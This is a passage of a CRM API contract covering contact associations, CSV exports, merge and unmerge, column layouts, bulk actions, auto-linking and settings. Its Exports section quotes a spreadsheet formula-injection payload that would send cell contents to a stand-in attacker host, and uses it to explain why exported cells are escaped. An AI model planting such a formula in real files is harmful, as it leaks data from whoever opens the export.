~~`GET /crm/companies/{id}/contacts` keeps its path and its meaning: platform
contacts.~~ **Superseded.** It keeps its path and now returns BOTH association
types in one response, each row carrying `source` (`platform` | `crm`), with
`counts` beside `total` — the same shape as `GET /crm/deals/{id}/contacts`, and
correct during the phase 7 migration as well as on either side of it.

On BOTH of those endpoints `total` now counts the people that RESOLVED, not the
association rows, whenever the request covered every association (`skip=0` and a
`limit` at least as large as the set). Deleting a contact from the audience
leaves its association behind — nothing on the platform side knows this
service's collections exist — so a record whose only person had been deleted
reported "Contacts (1)" over an empty list. On a later or capped page the
association count still stands, because the rows in hand are a window and their
count is the size of the window. The dangling rows are NOT pruned: a lookup that
failed and one that found nothing both come back empty (`host/directory.py`
swallows the error by design), so the two are indistinguishable from the read
side, and counting is reversible where deleting is not.

The same correction reaches the LIST views. `GET /crm/companies` and
`GET /crm/deals` no longer emit the stored `contact_count` rollup verbatim:
`services/live_counts` resolves the page's associated people in two reads and
overwrites the column where it can establish an answer, leaving the rollup in
place where it cannot. `contact_count` remains a stored field and is still
maintained on link and unlink — nothing about writes changed — but it is no
longer what the list shows, because a contact deleted from the audience
decrements neither it nor the association behind it. The
company detail payload still carries `linked_crm_contacts` beside
`linked_contacts`, but the company page no longer reads either for its Contacts
tab: under the unified flag those two keys hold the SAME rows (because
`person_entity(True)` is `"contact"`), so a screen reading the preview had to
dedupe a 20-row window against totals it could not reconcile. It loads this
endpoint instead.

`[CRM] contacts_source` survives only to tell the NOTE IMPORTER which
population a `contact_email` column means; it does not affect any endpoint
above.

What is given up, stated plainly: **per-account CRM fields on a person** —
owner, lifecycle stage, custom attributes, deal rollups. They have nowhere to
live, because the platform contact is one shared document per email address
across every account. Giving them a home again means forking that collection;
`CRM-P2-000-costing.md` prices it at 22–32 days.

Notes and tasks keep their `contact_ids` arms, which now hold PLATFORM contact
ids. Rows written before this change hold ids of deleted CRM contacts;
`scripts/migrate_crm_contacts_removal.py` reports and repoints them, matching
on email within the account. It deletes nothing — not the collection, not the
contact attribute rows, not the saved views. The CRM reads and writes `crm_contacts` and nothing else.

The reason is the one the paragraph above describes from the other side: one
seam produced two populations of the same person with no rule about which was
authoritative, and the ambiguity reached `crm_associations`, where a `contact`
row could hold either a platform id or a CRM one depending on which screen
wrote it. That is what CRM-406 was parked on, and severing the link answers it.

**What a client should do instead.** A CRM contact is not marketable. To market
to someone in the CRM, import them into the marketing audience as a contact in
their own right (`POST /contacts`, or a list import) — where they get their own
consent record and `subscribe_date`, which is the only honest way for a sales
record to become a subscriber. A client that was calling `/link` should stop;
the endpoints 404 rather than returning a failure envelope, deliberately, so
the break is loud.

⚠️ `ContactDetails` no longer carries `is_linked`, `contact_id` or `linked_at`.
A client that reads a missing key as "not linked" would be inferring a state
that no longer exists — treat their absence as "the concept is gone".

### Exports

| Method | Path | Permission |
|---|---|---|
| `POST` | `/crm/companies/export` | `companies:read` |
| `POST` | `/crm/deals/export` | `deals:read` |
| `GET` | `/crm/exports` · `/crm/exports/{id}` | `companies:read` |

**POST, not GET, deviating from §7.6.** A GET that creates a job is neither
cacheable nor repeatable, and a `record_ids` selection of ten thousand records
does not fit in a query string.

#### The export takes the list's own query parameters

`POST /crm/companies/export` accepts exactly the query parameters of
`GET /crm/companies`, and hands them to the same `crud.list` call. That is what
makes "exporting a filtered list exports the filter" true by construction
rather than by two implementations happening to agree — and the direction that
disagreement would go is *the file contains records the caller cannot see*.

Read is account-wide for both, matching the list endpoints: ownership narrows
writes, never reads. If that ever changes it must change in both places;
`test_e17_exports` asserts the list and the export return the same set.

Body: `{ columns, separator: ","|";", record_ids }`. `record_ids` is still
account-scoped — an id arriving from a client is not proof of ownership.

#### ⚠️ Cells are escaped against formula injection

A cell beginning `=`, `+`, `@`, tab or CR is **executed as a formula** by Excel,
LibreOffice and Sheets. A company named
`=HYPERLINK("https://evil.example/?d="&A1,"Invoice")` is code that runs on the
machine of whoever opens the export. The attacker needs no CRM access — a
public web form or one row of somebody else's imported list is enough — and the
victim is whoever clicks Export.

Every such cell is prefixed with `'`. Quoting does **not** help. A leading `-`
is escaped only when it is not part of a number, so negative amounts are
untouched.

The escaping is **exactly reversible** and the import worker un-escapes it, so
export → edit → re-import does not corrupt a name.

#### ID and Name are always included

Whatever `columns` asks for. The ID column is what makes update-by-re-import
possible — import with `dedupe_key: "company_id"` and `update_existing: true`
to update the records the file came from instead of creating a second copy of
each. A user has no other way to obtain the ID.

#### Formats

UTF-8 **with a BOM** (Excel needs it to read accents correctly), CRLF line
endings, datetimes as ISO-8601 **with an offset** in the account's timezone —
`15/08/2026 14:30` means two different days depending on who opens it.

Notes, files, activities and emails are not exportable: each is unbounded per
record and has its own endpoint.

#### Polling, expiry and retention

`GET /crm/exports/{id}` mints a short-lived signed URL **at poll time**, never
at write time — a URL stored on the job document would be valid for as long as
the row lives, and an export object is the account's entire customer database.
The list endpoint returns no URLs at all.

Files are deleted after 7 days by `export_worker.sweep_expired`. The job row
survives — who exported what is worth keeping and is far smaller than the file
— and a later poll reports `is_expired` with a message saying to run it again.

### Duplicates & merge

| Method | Path | Permission |
|---|---|---|
| `GET` | `/crm/companies/duplicates` | `companies:read` |
| `POST` | `/crm/companies/merge` | `companies:write` |
| `POST` | `/crm/companies/{id}/unmerge` | `companies:write` |

#### Detection returns tiers, never a boolean

`min_confidence=high|medium|low`, default `medium`. An exact domain match
(`high`) and a fuzzy name resemblance (`low`) are not the same claim, and
collapsing them either buries the certain ones or invites merging the uncertain
ones. Each pair appears **once** — asking every company "who matches you?"
naturally yields A→B and B→A — and both sides carry the same fields, including
`deal_count` and `created_at`, because that is what a reviewer decides on.

Matching is now served by an indexed `companies.name_normalised` rather than a
substring scan. The old query searched the *normalised needle* inside the *raw*
name, which cannot match "Acme Global Ltd" against "Acme & Global Limited" —
same normalised form, neither containing the other. Rows written before the
field existed still match through a fallback arm;
`scripts/backfill_company_name_normalised.py` fills them in and doubles as a
drift check.

#### `field_resolution` picks a SIDE, not a value

`{ survivor_id, merged_id, field_resolution: { "<field>": "survivor"|"merged" } }`

A merge endpoint that accepted arbitrary values would be a way to write data the
user never saw on the comparison screen, through an operation nobody audits
afterwards. Anything other than those two words is a business failure, as is
naming a protected field (`created_by`, `id`, the counters).

Beyond an explicit side the server fills blanks and **nothing else** — it never
prefers the longer description or the newer phone number. Tags and custom
fields are *unioned* unless a side is named.

#### What moves

Associations, activities, notes, tasks, files and deals all re-point to the
survivor. An association whose destination already exists is **deleted** rather
than moved — the unique index forbids the duplicate — and is recorded separately
so unmerge recreates it instead of moving it back.

#### Ordering, because there is no transaction

The snapshot is written **first**, before anything moves; the loser is archived
**last**. Interrupted partway, the result is two visible records and a complete
snapshot — untidy and fully reversible — rather than one invisible record and
no way back.

#### Unmerge is reversible for 30 days, and returns only what the merge took

`POST /crm/companies/{id}/unmerge`, where `{id}` is the company that was merged
**away**. It restores both records' field values — the resolution overwrote the
survivor too — and moves back **exactly the ids the snapshot recorded**.

That last point is the whole difficulty: a week later the survivor has records
of its own, and "move back everything pointing at the survivor" would hand the
loser records it never had, silently. Records deleted since the merge are not
resurrected.

After 30 days `merge_service.sweep_merges` drops the snapshot. The archived
company itself is kept, so activity entries and exports that name it still
resolve.

### Column layouts

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/view-preferences?object_type=` | `companies:read` **or** `deals:read` | — | `ResponseSchema[ViewPreference]` |
| `PUT` | `/crm/view-preferences` | same | `{object_type, columns[]}` | `ResponseSchema[ViewPreference]` |
| `DELETE` | `/crm/view-preferences?object_type=` | same | — | `ResponseSchema[ViewPreference]` |

The permission is the **object's read permission, not a settings one**. Choosing
which columns *you* see changes nothing for anybody else; gating it behind
`settings:write` would mean a rep who can read the companies list cannot
rearrange their own view of it.

```jsonc
// GET /crm/view-preferences?object_type=company
{
  "object_type": "company",
  "columns": [                       // the RESOLVED layout, in display order
    {"value": "name", "label": "Company name", "kind": "field", "locked": true},
    {"value": "industry", "label": "Sector", "kind": "field", "locked": false},
    {"value": "contact_count", "label": "Contacts", "kind": "derived", "locked": false}
  ],
  "available": [ /* same shape — everything the picker may offer */ ],
  "is_customised": true,             // has this user saved anything at all?
  "locked_columns": ["name"],
  "max_columns": 15,
  "export_unavailable": ["stage_name"]
}
```

#### ⚠️ The choice set is attributes ∪ derived columns

`GET /crm/attributes` describes the **writable** fields — the ones on the create
form. But four of the eight columns the companies list has shown since Phase 1
(`contact_count`, `deal_count`, `open_deal_value`, `last_activity_at`) are
denormalised counters that nobody can edit and no attribute row describes.

A picker built from the attributes endpoint alone would offer a choice set that
cannot express the layout the user is already looking at — so "customise your
columns" would take four columns away. `available` is therefore the union, and
`kind` distinguishes the two (`field` vs `derived`) so the picker can group and
label them.

#### The response is the resolved layout, never the stored one

Pruned of attributes deleted since it was saved, labelled with the **account's
own** attribute labels, and falling back to the shipped default when nothing was
chosen. A client that received the raw stored list would have to re-implement
all of that against `/crm/attributes`, and two implementations of the same rules
drift — the drift shows up as a column that renders on one screen and not
another.

#### Unknown columns: refused on write, pruned on read

Deliberately asymmetric.

* **On `PUT`** an unknown name means the client sent something this account has
  no definition for — a bug, and refusing names it. Dropping it silently would
  store a layout the user did not choose and they would find out by noticing a
  column missing.
* **On `GET`** the same name means an admin deleted the attribute after somebody
  put it in their layout. Failing that read would leave the user with a list
  view that will not render until an administrator restores a field they meant
  to delete — so it is pruned, the rest of the layout is kept, and only a layout
  reduced to nothing falls back to the default.

`name` is locked: it is the cell that links to the record, so a layout without
it is a table with no way into any row. `PUT` refuses a layout that drops it;
`GET` puts it back at the front if one is somehow stored.

#### PUT, not PATCH

A layout is an ordered whole. There is no meaningful partial update of "these
columns, in this order", and offering one would invite a client to send an
ordering fragment nobody can merge.

#### DELETE removes the row rather than storing the default

So *"never chose"* and *"chose exactly today's default"* stay distinguishable —
`is_customised` is what reports the difference. A future change to the shipped
layout then reaches the first group and leaves the second alone.

#### Stored per (account, user, object type)

Not on the user document. Tenancy here is `created_by == account_id`, a user can
belong to several accounts, and each account defines its own custom attributes —
so one layout on the user document would travel between accounts carrying column
names the other has never heard of, and the user would watch their columns
disappear on switching. It is also what makes saved views an added row rather
than a migration.

#### `export_unavailable`

Columns a list can show but an export cannot produce. Today: `stage_name`, which
is resolved from the pipeline when a deal is serialised and is not stored on the
deal, so the export writer has nothing to write.

Published so the export dialog can **say** a column was left out. An export
narrower than the screen with no explanation is indistinguishable from missing
data. The denormalised counters went the other way — they are stored fields, so
E17's `SYSTEM_COLUMNS` gained them and they export fine.

### Bulk actions

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `POST` | `/crm/companies/bulk` | `companies:write` | `BulkActionRequest` | `ResponseSchema[BulkActionResult]` |
| `POST` | `/crm/deals/bulk` | `deals:write` | `BulkActionRequest` | `ResponseSchema[BulkActionResult]` |

`?hard=true` on either turns `delete` into a permanent delete and is refused for
anyone who is not the account owner or does not hold `crm:manage_others`.
Without it, `delete` archives — the same thing the single-record button does,
because a bulk action that behaved differently from the button next to it would
be a trap.

```jsonc
// POST /crm/companies/bulk
{
  "ids": ["66b1…", "66b2…"],   // EITHER this
  "filters": { "industry": "Retail" },  // OR this. Never both, never neither.
  "action": "set_owner",
  "payload": { "owner_id": "66aa…" }
}
```

**Actions.** Companies: `set_owner` · `set_attribute` · `add_tags` ·
`remove_tags` · `archive` · `delete`. Deals additionally: `move_pipeline`.
Sending a deal-only action to the companies endpoint is refused by name.

**Payload rules** — each of these is refused with a 200 business failure rather
than accepted and half-applied:

| Action | Required payload | Why it's enforced |
|---|---|---|
| `set_owner` | `owner_id` | Absent, this blanks the owner on every selected record — a plausible client bug and a destructive one nobody clicked |
| `add_tags` / `remove_tags` | non-empty `tag_ids` | — |
| `set_attribute` | `internal_name` **and** the `value` **key** | `value: null` clears the field and is legitimate; an *absent* key is a malformed request. They are not the same thing |
| `move_pipeline` | `pipeline_id` **and** `stage_id` | A pipeline with no stage lands the deals nowhere and they vanish from every board |

#### ⚠️ Either ids or filters — the filter form is resolved through the list endpoint's own query

`filters` is what powers "select all 2,847 matching" without the client
enumerating 2,847 ids in a request body. It resolves through the **same**
`crud.list` call `GET /crm/companies` makes, so the set acted on is the set that
was on screen. A second implementation would eventually act on a different set,
and the direction that goes is "it changed records I did not mean".

Sending both, or neither, is refused.

#### A partial result is a success

HTTP 200, `status: "success"`, and the counts. A bulk operation that half-worked
did half-work; returning a failure would tell the client to retry the whole
thing.

| Field | Meaning |
|---|---|
| `matched` | How many the selection matched, **before** the cap |
| `updated` | Records actually written |
| `skipped` | Already as requested, or excluded by a business rule |
| `skipped_no_permission` | Someone else's records. **Additive to the Phase 1 shape** |
| `skipped_reason` | Why, when there is one — e.g. `"closed deals were left where they are"` |
| `failed` | Errored. One bad record never abandons the other thousand |

The four are separate because they are four different problems with four
different fixes. "12 of 40 updated" without the breakdown is not something
anyone can act on.

#### The cap is reported, never silently applied

One request changes at most **1,000** records. `matched` still reports the true
count, and `message` carries the notice: *"9,000 records matched; this run
changed the first 1,000. Run it again to continue."*

A silent cap is indistinguishable from success. A user told "1,000 updated" with
no explanation concludes 8,000 failed; one told nothing concludes all 9,000 were
done. Both are wrong, and the second leaves 8,000 records in a state they
believe they changed.

#### Permission is checked per record, not once per batch

A selection of forty can span owners, and "you don't have permission" for the
whole batch because one record belongs to someone else is not a useful answer.
Each record runs the single-record ownership rule; the ones that fail land in
`skipped_no_permission`. This is also why the implementation is per-record
rather than one `update_many` — that, and each record earning its own activity
entry.

#### Closed deals are not moved

`move_pipeline` skips won and lost deals and says so in `skipped_reason`. A
closed deal has an outcome; moving it to an open stage would silently reopen it
and corrupt every won/lost report.

#### One activity per record, never one per field

A bulk retag of 400 records writes 400 timeline entries, not 1,200. The activity
records the action and the field names, and the whole trail is written in one
batch after the updates — a trail that fails must never fail the writes it
describes.

### Auto-linking contacts to companies

Not an endpoint — behaviour. When a contact is created or its email **changes**,
the contact is linked to the company matching its email domain, creating that
company if it does not exist (`source: "auto_domain"`).

| Method | Path | Permission |
|---|---|---|
| `PATCH` | `/crm/settings` | `pipelines:write` |

`{ auto_link_contacts_by_domain, free_email_domains_blocklist }` — the only
writable settings fields today. The rest are edited from the settings screens
that land with E21; a PATCH accepting everything now would ship fields nobody
validates. Note the write needs `pipelines:write` while the GET needs
`deals:read`: reading a picklist is something every rep does, changing how the
account behaves is an admin action.

#### ⚠️ The free-provider list is a floor, not a seed

`free_email_domains_blocklist` defaults to an **empty list**. A version of this
that trusted the account's list would link every `@gmail.com` contact to one
company called "Gmail", which then collects thousands of unrelated people, tops
every list sorted by contact count, and is miserable to unpick.

So `auto_link.FREE_EMAIL_DOMAINS` (~200 consumer, ISP, regional and disposable
providers) is consulted **always**, and the account's list **adds** to it. An
account can block more; it cannot unblock Gmail.

#### Which paths trigger it

**Authenticated paths only** — `POST`/`PATCH /contacts` and the CSV list import.
The public contact-creating paths (landing pages, signup forms, quizzes, event
ingestion, webhooks) deliberately do not: an unauthenticated visitor filling in
a form should not be able to make a company appear in someone's CRM.

#### It only ever adds

On an email change the contact gains a link to the new domain's company; the old
link stays. Removing it would be the system deleting a relationship a person may
have curated — someone who moved from one customer to another is genuinely
connected to both — and an extra link is visible and deletable, while a missing
one is not.

#### Failures are invisible to the caller

This runs inside the **contact API's** request. Every failure is swallowed and
logged: a CRM convenience that makes a contact write fail, or slow, is a worse
outcome than a contact that is not linked.

#### Rollout (Q6, decided 2026-08-15): on for new accounts, off for existing

The model default is `True`, so new accounts get it. `scripts/migrate_crm_auto_link_default.py`
runs **once at deploy** and sets it `False` on every account that already
exists — otherwise an account with 50,000 contacts could gain thousands of
companies without anyone choosing that. Turning it on from the toggle records
`auto_link_opted_in`, so a later re-run of the migration cannot undo a
deliberate choice.

### Settings & attributes

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/settings` | `deals:read` | — | `ResponseSchema[CrmSettings]` |
| `GET` | `/crm/attributes` | `pipelines:read` | `object_type`, `show_on_form` | `ResponseSchema[{data,total}]` |

`GET /crm/attributes` publishes the attribute definitions, in `form_order`. It
exists because a stage's `required_attributes` is a list of `internal_name`
strings, and the stage editor's picker must offer **exactly** the names
`stage_rules.missing_required_attributes` resolves labels from. A hard-coded
client list drifts, and a stage requiring a name nothing can satisfy traps every
deal in that stage — the move is refused and the fill-in dialog has nothing to
offer. Both `is_system` (core typed fields) and custom rows are returned; a
stage can require either. Writes are Phase 2, and need the `internal_name`
immutability guard first.

Added during E9, not at the original freeze — see the change log.

`POST /crm/deals/{id}/close` refuses a lost deal without a `lost_reason_id`
and validates that id against `crm_settings.lost_reasons`. Without a way to
READ that list, the Close-as-lost dialog has nothing to populate its picker
with and the flow is unreachable from the UI. Read access is therefore part of
the Phase 1 deal contract; **writing** settings is not, and there is
deliberately no `PATCH` yet.

```jsonc
{
  "status": "success",
  "data": {
    "currency": "INR",
    "industries": ["SaaS & Software", "..."],
    "lost_reasons": [
      { "id": "...", "label": "Price", "order": 0, "is_active": true },
      { "id": "...", "label": "Retired reason", "order": 1, "is_active": false }
    ],
    "task_types": ["Call", "Email", "Meeting"],
    "auto_link_contacts_by_domain": true,
    "card_display_attributes": ["amount", "expected_close_date"],
    "default_pipeline_id": "..."
  }
}
```

**Retired lost reasons are returned, not filtered out.** A deal closed against
a since-retired reason still has to render its label, so the client filters on
`is_active` for pickers and looks up by `id` for display. Reasons arrive sorted
by `order`; render them in the order received.

The document is created on first read, so this endpoint never 404s and never
returns null for a valid account.

---

## Not in Phase 1

These appear in the requirements doc but have **no frozen contract yet** — do not build client code against guesses. They will be added here at the start of their phase.

**Only one entry is left:** Reports (`/crm/reports/*`), deferred by decision —
see `CRM_BREVO_PARITY_GAP_ANALYSIS.md` §2.

Attribute writes, Notes, Files and Saved views were all on this list and have
all shipped. The checker found them documented-as-absent while the routers
served them, which is the drift direction that costs the most: a frontend
engineer reads "no frozen contract yet" and builds something else.

---

## Every endpoint — generated

The hand-written sections above carry the prose that matters: the envelopes,
the error semantics, and the rules with teeth. They do **not** reliably carry
the full endpoint list — the contract was frozen at Phase 1 and six phases
landed on top of it, leaving 27 endpoints undocumented and 5 documented as
unshipped.

So the list itself is no longer transcribed. It is generated from the routers
by AST, and the same script verifies it:

```
python3 scripts/check_crm_contract.py          # fails on drift either way
python3 scripts/check_crm_contract.py --emit   # regenerate the block below
```

<!-- GENERATED: scripts/check_crm_contract.py --emit — do not edit by hand -->

Every CRM endpoint the routers expose, with the permission that gates it
and the response model it declares. Regenerate with
`python3 scripts/check_crm_contract.py --emit`; verify with the same
script and no flag, which fails on drift in either direction.

**97 endpoints across 14 routers.**

#### Attributes

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/attributes` | `pipelines:read` | `ResponseSchema` |
| `POST` | `/crm/attributes` | `settings:write` | `ResponseSchema[AttributeDetails]` |
| `PUT` | `/crm/attributes/reorder` | `settings:write` | `ResponseSchema` |
| `DELETE` | `/crm/attributes/{attribute_id}` | `settings:write` | `ResponseSchema` |
| `PATCH` | `/crm/attributes/{attribute_id}` | `settings:write` | `ResponseSchema[AttributeDetails]` |

#### Column layouts

| Method | Path | Permission | Response model |
|---|---|---|---|
| `DELETE` | `/crm/view-preferences` | `companies:read · deals:read` | `ResponseSchema` |
| `GET` | `/crm/view-preferences` | `companies:read · deals:read` | `ResponseSchema` |
| `PUT` | `/crm/view-preferences` | `companies:read · deals:read` | `ResponseSchema` |

#### Companies

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/companies` | `companies:read` | `CompanyListResponse` |
| `POST` | `/crm/companies` | `companies:write` | `ResponseSchema[CompanyDetails]` |
| `POST` | `/crm/companies/bulk` | `companies:write` | `ResponseSchema[BulkActionResult]` |
| `GET` | `/crm/companies/duplicates` | `companies:read` | `ResponseSchema` |
| `GET` | `/crm/companies/filter-fields` | `companies:read` | `ResponseSchema` |
| `POST` | `/crm/companies/merge` | `companies:write` | `ResponseSchema` |
| `DELETE` | `/crm/companies/{company_id}` | `companies:write` | `ResponseSchema` |
| `GET` | `/crm/companies/{company_id}` | `companies:read` | `ResponseSchema[CompanyDetails]` |
| `PATCH` | `/crm/companies/{company_id}` | `companies:write` | `ResponseSchema[CompanyDetails]` |
| `GET` | `/crm/companies/{company_id}/activities` | `companies:read` | `ResponseSchema` |
| `GET` | `/crm/companies/{company_id}/contacts` | `companies:read` | `ResponseSchema` |
| `GET` | `/crm/companies/{company_id}/deals` | `companies:read` | `ResponseSchema` |
| `DELETE` | `/crm/companies/{company_id}/links` | `companies:write` | `ResponseSchema` |
| `POST` | `/crm/companies/{company_id}/links` | `companies:write` | `ResponseSchema` |
| `POST` | `/crm/companies/{company_id}/unmerge` | `companies:write` | `ResponseSchema` |

#### Contacts

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/contacts` | `contacts:read` | `ContactListResponse` |
| `POST` | `/crm/contacts` | `contacts:write` | `ResponseSchema[ContactDetails]` |
| `POST` | `/crm/contacts/bulk` | `contacts:write` | `ResponseSchema[BulkActionResult]` |
| `GET` | `/crm/contacts/by-platform/{platform_contact_id}` | `contacts:read` | `ResponseSchema` |
| `GET` | `/crm/contacts/filter-fields` | `contacts:read` | `ResponseSchema` |
| `DELETE` | `/crm/contacts/{contact_id}` | `contacts:write` | `ResponseSchema` |
| `GET` | `/crm/contacts/{contact_id}` | `contacts:read` | `ResponseSchema[ContactDetails]` |
| `PATCH` | `/crm/contacts/{contact_id}` | `contacts:write` | `ResponseSchema[ContactDetails]` |
| `GET` | `/crm/contacts/{contact_id}/activities` | `contacts:read` | `ResponseSchema` |

#### Deals

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/deals` | `deals:read` | `DealListResponse` |
| `POST` | `/crm/deals` | `deals:write` | `ResponseSchema[DealDetails]` |
| `POST` | `/crm/deals/bulk` | `deals:write` | `ResponseSchema[BulkActionResult]` |
| `GET` | `/crm/deals/filter-fields` | `deals:read` | `ResponseSchema` |
| `DELETE` | `/crm/deals/{deal_id}` | `deals:write` | `ResponseSchema` |
| `GET` | `/crm/deals/{deal_id}` | `deals:read` | `ResponseSchema[DealDetails]` |
| `PATCH` | `/crm/deals/{deal_id}` | `deals:write` | `ResponseSchema[DealDetails]` |
| `GET` | `/crm/deals/{deal_id}/activities` | `deals:read` | `ResponseSchema` |
| `POST` | `/crm/deals/{deal_id}/close` | `deals:write` | `ResponseSchema[DealDetails]` |
| `GET` | `/crm/deals/{deal_id}/companies` | `deals:read` | `ResponseSchema` |
| `GET` | `/crm/deals/{deal_id}/contacts` | `deals:read` | `ResponseSchema` |
| `DELETE` | `/crm/deals/{deal_id}/links` | `deals:write` | `ResponseSchema` |
| `POST` | `/crm/deals/{deal_id}/links` | `deals:write` | `ResponseSchema` |
| `POST` | `/crm/deals/{deal_id}/reopen` | `deals:write` | `ResponseSchema[DealDetails]` |
| `PATCH` | `/crm/deals/{deal_id}/stage` | `deals:write` | `ResponseSchema[Union[DealDetails, StageChangeRejection]]` |
| `GET` | `/crm/pipelines/{pipeline_id}/board` | `deals:read` | `BoardResponse` |
| `GET` | `/crm/pipelines/{pipeline_id}/board/stages/{stage_id}/deals` | `deals:read` | `DealListResponse` |

#### Exports

| Method | Path | Permission | Response model |
|---|---|---|---|
| `POST` | `/crm/companies/export` | `companies:read` | `ResponseSchema[ExportDetails]` |
| `POST` | `/crm/deals/export` | `deals:read` | `ResponseSchema[ExportDetails]` |
| `GET` | `/crm/exports` | `companies:read` | `ExportListResponse` |
| `GET` | `/crm/exports/{export_id}` | `companies:read` | `ResponseSchema[ExportDetails]` |

#### Files

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/files` | `companies:read · deals:read · contacts:read` | `FileListResponse` |
| `POST` | `/crm/files` | `companies:write · deals:write · contacts:write` | `ResponseSchema[FileDetails]` |
| `GET` | `/crm/files/local/{key:path}` | `companies:read · deals:read · contacts:read` | `—` |
| `DELETE` | `/crm/files/{file_id}` | `companies:write · deals:write · contacts:write` | `ResponseSchema` |
| `GET` | `/crm/files/{file_id}/download` | `companies:read · deals:read · contacts:read` | `ResponseSchema` |

#### Imports

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/imports` | `companies:read · deals:read · contacts:read` | `ImportListResponse` |
| `POST` | `/crm/imports` | `companies:write · deals:write · contacts:write` | `ResponseSchema[ImportDetails]` |
| `POST` | `/crm/imports/preview` | `companies:write · deals:write · contacts:write` | `ResponseSchema[ImportPreview]` |
| `GET` | `/crm/imports/{import_id}` | `companies:read · deals:read · contacts:read` | `ResponseSchema[ImportDetails]` |
| `POST` | `/crm/imports/{import_id}/cancel` | `companies:write · deals:write · contacts:write` | `ResponseSchema[ImportDetails]` |
| `GET` | `/crm/imports/{import_id}/errors` | `companies:read · deals:read · contacts:read` | `—` |

#### Notes

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/notes` | `companies:read · deals:read · contacts:read` | `NoteListResponse` |
| `POST` | `/crm/notes` | `companies:write · deals:write · contacts:write` | `ResponseSchema[NoteDetails]` |
| `DELETE` | `/crm/notes/{note_id}` | `companies:write · deals:write · contacts:write` | `ResponseSchema` |
| `PATCH` | `/crm/notes/{note_id}` | `companies:write · deals:write · contacts:write` | `ResponseSchema[NoteDetails]` |
| `POST` | `/crm/notes/{note_id}/pin` | `companies:write · deals:write · contacts:write` | `ResponseSchema[NoteDetails]` |
| `POST` | `/crm/notes/{note_id}/unpin` | `companies:write · deals:write · contacts:write` | `ResponseSchema[NoteDetails]` |

#### Pipelines

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/pipelines` | `pipelines:read` | `PipelineListResponse` |
| `POST` | `/crm/pipelines` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |
| `DELETE` | `/crm/pipelines/{pipeline_id}` | `pipelines:write` | `ResponseSchema` |
| `GET` | `/crm/pipelines/{pipeline_id}` | `pipelines:read` | `ResponseSchema[PipelineDetails]` |
| `PATCH` | `/crm/pipelines/{pipeline_id}` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |
| `POST` | `/crm/pipelines/{pipeline_id}/stages` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |
| `PUT` | `/crm/pipelines/{pipeline_id}/stages/reorder` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |
| `DELETE` | `/crm/pipelines/{pipeline_id}/stages/{stage_id}` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |
| `PATCH` | `/crm/pipelines/{pipeline_id}/stages/{stage_id}` | `pipelines:write` | `ResponseSchema[PipelineDetails]` |

#### Saved views

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/saved-views` | `companies:read · deals:read` | `ResponseSchema` |
| `POST` | `/crm/saved-views` | `companies:read · deals:read` | `ResponseSchema[SavedViewDetails]` |
| `DELETE` | `/crm/saved-views/{view_id}` | `companies:read · deals:read` | `ResponseSchema` |
| `PATCH` | `/crm/saved-views/{view_id}` | `companies:read · deals:read` | `ResponseSchema[SavedViewDetails]` |

#### Settings

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/settings` | `deals:read` | `ResponseSchema` |
| `PATCH` | `/crm/settings` | `pipelines:write` | `ResponseSchema` |

#### Tasks

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/task-types` | `crm_tasks:read` | `ResponseSchema[List[str]]` |
| `GET` | `/crm/tasks` | `crm_tasks:read` | `TaskListResponse` |
| `POST` | `/crm/tasks` | `crm_tasks:write` | `ResponseSchema[TaskDetails]` |
| `POST` | `/crm/tasks/bulk` | `crm_tasks:write` | `ResponseSchema[BulkTaskResult]` |
| `DELETE` | `/crm/tasks/{task_id}` | `crm_tasks:write` | `ResponseSchema[Dict[str, Any]]` |
| `GET` | `/crm/tasks/{task_id}` | `crm_tasks:read` | `ResponseSchema[TaskDetails]` |
| `PATCH` | `/crm/tasks/{task_id}` | `crm_tasks:write` | `ResponseSchema[TaskDetails]` |
| `POST` | `/crm/tasks/{task_id}/complete` | `crm_tasks:write` | `ResponseSchema[TaskDetails]` |

#### reports

| Method | Path | Permission | Response model |
|---|---|---|---|
| `GET` | `/crm/reports/conversion` | `deals:read` | `ResponseSchema` |
| `GET` | `/crm/reports/lost-reasons` | `deals:read` | `ResponseSchema` |
| `GET` | `/crm/reports/pipeline` | `deals:read` | `ResponseSchema` |
| `GET` | `/crm/reports/time-in-stage` | `deals:read` | `ResponseSchema` |

<!-- /GENERATED -->

---

## Change log

| Date | Change | By |
|---|---|---|
| 2026-08-13 | Initial freeze — companies, pipelines, deals, board (CRM-004) | — |
| 2026-08-13 | Added `GET /crm/settings` (read-only). Unblocks the Close-as-lost dialog, which cannot populate its reason picker without it. Additive — no existing shape changed. | E9 |
| 2026-08-13 | **Breaking, and a bug fix:** record ids serialise as `id`, not `_id`. The doc previously showed `_id`, which is what the code emitted and what no client could use. See "Object ids on the wire". | Review |
| 2026-08-13 | `GET /crm/deals?pipeline_id=all` now works — it was typed `PyObjectId` and 422'd on the literal "all" the contract documents. A malformed id is now a 200 business failure, not a 422. `DealListResponse` gains an optional `message` to carry it. | Review |
| 2026-08-13 | `PATCH /crm/deals/{id}/stage` response_model widened to `ResponseSchema[Union[DealDetails, StageChangeRejection]]`. The missing-required-attributes rejection was failing FastAPI's outbound validation and returning 500, so the fill-in dialog could never appear. | Review |
| 2026-08-13 | Clarified that `missing_attributes` carries display **labels**, not internal names. The example previously showed snake_case, which no client should match on. | Review |
| 2026-08-13 | Added `GET /crm/attributes` (read-only). Unblocks the stage editor's required-attributes picker, which otherwise had to hard-code the internal_names the server validates against. Additive. | E10 |
